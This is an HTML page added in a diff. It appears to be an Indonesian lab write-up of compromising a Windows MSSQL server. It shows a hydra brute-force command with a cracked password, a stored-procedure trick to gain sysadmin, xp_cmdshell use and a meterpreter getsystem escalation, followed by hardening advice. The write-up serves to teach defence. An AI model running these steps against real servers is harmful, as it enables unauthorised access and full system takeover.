@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: MSSQL to SYSTEM Compromise | alif-cybersec</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --accent: #10b981; --dark: #020617; }
+        body { background-color: var(--dark); color: #e2e8f0; font-family: 'Inter', sans-serif; line-height: 1.6; }
+        .terminal-font { font-family: 'Fira Code', monospace; }
+        .glow-text { text-shadow: 0 0 10px rgba(16, 185, 129, 0.5); }
+        .accent-emerald { color: var(--accent); }
+        
+        .cyber-gradient {
+            background: linear-gradient(90deg, #fff 0%, var(--accent) 50%, #fff 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 8s linear infinite;
+        }
+        @keyframes shine {
+            to { background-position: 200% center; }
+        }
+        
+        body::before {
+            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            z-index: 9999; background-size: 100% 4px, 3px 100%; pointer-events: none; opacity: 0.4;
+        }
+
+        .hero-banner { 
+            height: 350px; 
+            background: linear-gradient(to bottom, rgba(2, 6, 23, 0.2), var(--dark)), url('https://images.unsplash.com/photo-1544383835-bda2bc66a55d?auto=format&fit=crop&q=80&w=2000'); 
+            background-size: cover; background-position: center;
+            border-bottom: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .content-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(16, 185, 129, 0.1); backdrop-blur: xl; }
+        pre { background-color: #010409; border-left: 3px solid var(--accent); padding: 1.25rem; border-radius: 0.5rem; font-size: 0.85rem; overflow-x: auto; }
+        .step-num { font-size: 4rem; font-weight: 900; color: rgba(16, 185, 129, 0.05); position: absolute; left: -2rem; top: -1rem; line-height: 1; }
+    </style>
+</head>
+<body class="antialiased selection:bg-emerald-500/30">
+    <div class="hero-banner relative flex items-end pb-12">
+        <div class="max-w-4xl mx-auto w-full px-6">
+            <div class="inline-block px-3 py-1 bg-emerald-500/20 border border-emerald-500/40 rounded text-[10px] font-black uppercase tracking-[0.3em] accent-emerald mb-4">Research // WIN-004</div>
+            <h1 class="text-4xl md:text-7xl font-black tracking-tighter text-white glow-text">
+                MSSQL <span class="accent-emerald">System Pwn</span>
+            </h1>
+        </div>
+    </div>
+
+    <div class="max-w-4xl mx-auto px-6 py-16">
+        <div class="flex flex-wrap gap-4 mb-16">
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#mssql-exploitation</span>
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#sql-privesc</span>
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#named-pipe-impersonation</span>
+        </div>
+
+        <!-- Exec Summary -->
+        <section class="mb-24">
+            <div class="p-8 content-card rounded-2xl border-l-4 border-l-emerald-500 shadow-2xl">
+                <h2 class="text-xl font-bold accent-emerald mb-4 uppercase tracking-widest">Executive Summary</h2>
+                <p class="text-slate-300 italic text-lg leading-relaxed">
+                    "Audit ini mengungkap kerentanan pada infrastruktur database Windows. Eksploitasi dimulai dari pengumpulan informasi melalui layanan FTP yang terekspos, diikuti dengan serangan brute-force pada MSSQL, hingga eskalasi hak akses sistem tertinggi (NT AUTHORITY\SYSTEM) melalui teknik impersonasi Named Pipe."
+                </p>
+            </div>
+        </section>
+
+        <!-- Phase 1: Recon -->
+        <section class="mb-24 relative">
+            <div class="step-num">01</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Reconnaissance & Initial Entry
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Enumerasi awal pada layanan FTP mengungkap informasi <em>Banner Grabbing</em> yang membocorkan nama pengguna potensial (<code>operator_sql</code>). Menggunakan informasi ini, serangan brute-force dilakukan pada layanan MSSQL (Port 1433).
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs space-y-2">
+                    <div class="text-slate-500"># Targeted brute force against MSSQL</div>
+                    <div class="text-emerald-400">$ hydra -l operator_sql -P /usr/share/wordlists/rockyou.txt 10.1.2.x mssql</div>
+                    <div class="mt-2 text-white">[1433][mssql] host: 10.1.2.x login: <span class="text-emerald-500">operator_sql</span> password: <span class="text-emerald-500">sql_pass123</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 2: SQL PrivEsc -->
+        <section class="mb-24 relative">
+            <div class="step-num">02</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> SQL Privilege Escalation: Sysadmin Role
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Setelah mendapatkan akses ke MSSQL, kami menemukan bahwa akun pengguna memiliki hak terbatas. Namun, melalui manipulasi prosedur tersimpan (Stored Procedures), kami berhasil meningkatkan peran pengguna menjadi <code>sysadmin</code>.
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs space-y-1">
+                    <div class="text-emerald-400">SQL (operator_sql)> <span class="text-white">CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'operator_sql', 'sysadmin';</span></div>
+                    <div class="text-emerald-400">SQL (operator_sql)> <span class="text-white">EXEC sp_elevate_me;</span></div>
+                    <div class="text-emerald-400">SQL (operator_sql)> <span class="text-white">SELECT IS_SRVROLEMEMBER('sysadmin');</span></div>
+                    <div class="text-yellow-400 font-bold mt-2">[+] Result: 1 (Success)</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 3: System Access -->
+        <section class="mb-24 relative">
+            <div class="step-num">03</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Execution & System Impersonation
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Dengan hak akses <code>sysadmin</code>, kami mengaktifkan <code>xp_cmdshell</code> untuk mendapatkan reverse shell. Eskalasi akhir ke level <strong>SYSTEM</strong> dilakukan menggunakan teknik <em>Named Pipe Impersonation</em> (PrintSpooler variant).
+            </p>
+            <div class="bg-black/60 rounded-xl p-8 border border-slate-800 shadow-2xl">
+                <div class="terminal-font text-sm space-y-2">
+                    <div class="text-yellow-400">meterpreter > getsystem</div>
+                    <div class="text-slate-500">...got system via technique 5 (Named Pipe Impersonation).</div>
+                    <div class="mt-4 text-white"># whoami</div>
+                    <div class="text-emerald-500 font-black">NT AUTHORITY\SYSTEM</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Lessons -->
+        <section class="mb-20 border-t border-slate-800 pt-16">
+            <h2 class="text-xl font-bold accent-emerald mb-10 flex items-center tracking-widest"><span class="mr-4 opacity-50 text-white">04</span> LESSONS LEARNED</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">FTP Hardening</div>
+                    <p class="text-slate-500 leading-relaxed">Jangan biarkan banner FTP membocorkan nama pengguna sistem yang valid.</p>
+                </div>
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">SQL Policy</div>
+                    <p class="text-slate-500 leading-relaxed">Nonaktifkan <code>xp_cmdshell</code> dan batasi kemampuan pembuatan prosedur tersimpan.</p>
+                </div>
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">Service Hardening</div>
+                    <p class="text-slate-500 leading-relaxed">Patch sistem Windows untuk mencegah eksploitasi impersonasi pipe yang umum.</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="pt-16 border-t border-slate-800 text-center">
+            <a href="../index.html" class="inline-block px-10 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg transition-all shadow-lg">RETURN TO DASHBOARD</a>
+        </footer>
+    </div>
+</body>
+</html>
